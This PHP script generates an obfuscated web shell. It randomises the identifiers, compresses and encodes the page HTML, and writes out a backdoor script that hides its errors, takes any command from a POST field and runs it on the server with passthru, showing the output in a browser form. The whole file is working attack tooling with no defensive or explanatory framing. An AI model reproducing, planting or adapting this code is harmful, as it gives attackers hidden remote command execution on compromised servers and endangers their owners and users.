<?php

// are we running from a webserver or terminal?
if ( ! isset($_SERVER['TERM'])){
	header('Content-Type: text/plain');
}


function make_random_name(){

	// making some randomness
	$name = rand() * rand();
	$name = hash("whirlpool", $name);
	$name = crypt($name, rand());

	// shorten
	$name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);

	// rm leading numbers
	$name = preg_replace('/^[0-9]+/', '', $name);

	// make sure the regex didn't leave us an empty string
	return ($name = NULL? make_random_name(): $name);
}

$_2233 = array(
	"eval_function"    => make_random_name(),
	"eval_arg"         => make_random_name(),
	"html_console_tag" => make_random_name(),
	"post_2233"        => make_random_name(),
	"post_command"     => make_random_name(),
	"script_name"      => make_random_name(),
	"no_command"       => ' ',
	"page_html"        => make_random_name(),
	"page_html_var"    => make_random_name()
	);

/* php doesn't seem to like arrays in heredocs */
$script_name = $_2233['script_name'];
$html_console_tag = $_2233['html_console_tag'];
$post_2233 = $_2233['post_2233'];

$_2233['page_html'] = <<< EOF
<html>
	<head>
		<style>
			input{ background-color: rgb(255, 255, 255); width: 100%;}
			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
			body{ background-color: rgb(250, 250, 250);}
			$html_console_tag{ color: rgb(170, 170, 170);}
		</style>
	</head>
	<body>
		<form action="$script_name" id="form" method="POST">
			<input type="text" name="$post_2233" autocomplete="off" autofocus>
			<span> 2&gt;&amp;1 </span><button type="submit">\$\$\$</button>
		</form>
	<code>
<pre>
EOF;

$_2233['page_html']=base64_encode(gzdeflate($_2233['page_html']));

echo '<?php
error_reporting(0);@ini_set("display_errors", 0);
$'.$_2233['page_html_var'].' = gzinflate(base64_decode("'.$_2233['page_html'].'"));

function '.$_2233['eval_function'].'($'.$_2233['eval_arg'].'){
	echo "<'.$_2233['html_console_tag'].'>$ ".$'.$_2233['eval_arg'].'."</'.$_2233['html_console_tag'].'><br>";
	echo passthru($'.$_2233['eval_arg'].'." 2>&1");
}
$'.$_2233['post_command'].'=$_POST["'.$_2233['post_2233'].'"];
echo preg_replace('."'/".$_2233['script_name']."/'".', '."basename(\$_SERVER[\"SCRIPT_NAME\"]), $".$_2233['page_html_var'].');

if (isset($'.$_2233['post_command'].')){
	'.$_2233['eval_function'].'($'.$_2233['post_command'].');
}
else {
	'.$_2233['eval_function'].'('.$_2233['no_command'].');
}
?>
';

?>
